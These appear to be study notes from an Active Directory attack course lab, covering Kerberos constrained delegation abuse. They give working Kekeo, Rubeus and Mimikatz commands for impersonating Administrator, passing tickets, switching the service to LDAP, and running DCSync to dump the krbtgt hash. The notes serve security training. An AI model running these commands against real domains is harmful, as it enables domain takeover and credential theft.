
# Constrained Delegation

• Constrained Delegation when enabled on a service account, allows access only to specified services on specified computers as a user. 

• A typical scenario where constrained delegation is used - A user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorization. 

• To impersonate the user, Service for User (S4U) extension is used which provides two extensions: 

– Service for User to Self (S4U2self) - Service for User to Self (S4U2self) - Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password. The service account must have the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION – T2A4D UserAccountControl attribute. 

– Service for User to Proxy (S4U2proxy) - Allows a service to obtain a TGS to a second service on behalf of a user. Which second service? This is controlled by msDS-AllowedToDelegateTo attribute. This attribute contains a list of SPNs to which the user tokens can be forwarded.

## Constrained Delegation with Protocol Transition

![[Pasted image 20230106213749.png]]

• A user - Joe, authenticates to the web service (running with service account websvc) using a non-Kerberos compatible authentication mechanism. 

• The web service requests a ticket from the Key Distribution Center (KDC) for Joe's account without supplying a password, as the websvc account. 

• The KDC checks the websvc userAccountControl value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute, and that Joe's account is not blocked for delegation. If OK it returns a forwardable ticket for Joe's account (S4U2Self). 

• The service then passes this ticket back to the KDC and requests a service ticket for the CIFS/dcorpmssql.dollarcorp.moneycorp.local service. 

• The KDC checks the msDS-AllowedToDelegateTo field on the websvc account. If the service is listed it will return a service ticket for dcorp-mssql (S4U2Proxy). 

• The web service can now authenticate to the CIFS on dcorpmssql as Joe using the supplied TGS.

##### To abuse constrained delegation in above scenario, we need to have access to the websvc account. If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of the websvc account as ANY user.

#### Enumerate users and computers with constrained delegation enabled
```powershell
# Using PowerView (dev) 
Get-DomainUser –TrustedToAuth
Get-DomainComputer –TrustedToAuth

# Using ActiveDirectory module: 
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

#### Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram): 
```cmd
kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
```

#### Using s4u from Kekeo, we request a TGS (steps 4 & 5): 
```powershell
tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
```

#### Pass the ticket
```powershell 
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorpmssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LO CAL.kirbi"' 

ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$

# With Rubeus, We are requesting a TGT and TGS' in a single command
.\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/dcorpmssql.dollarcorp.moneycorp.LOCAL" /ptt 

ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

### Different Services

#### Using asktgt from Kekeo, we request a TGT for dcorp-adminsrv:
```powershell
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
```

#### Using s4u from Kekeo_one (no SNAME validation):
```powershell
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorpdc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL
```

#### Using mimikatz:
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorpdc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL _ALT.kirbi"'

# Dump hashes with DCSync since we have exported TGS
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

# With Rubeus
.\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:1fadb1b13edbc5a61cbdc389e6f34c67 /impersonateuser:Administrator /msdsspn:"time/dcorpdc.dollarcorp.moneycorp.LOCAL" /altservice:ldap /ptt

# Dump hashes with DCSync since we have TGS from Rubeus
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

# Learning Objective 18

• Enumerate users in the domain for whom Constrained Delegation is enabled. 
– For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured. 
– Pass the ticket and access the service as DA. 

• Enumerate computer accounts in the domain for which Constrained Delegation is enabled. 
– For such a user, request a TGT from the DC.
– Use the TGS for executing the DCSync attack.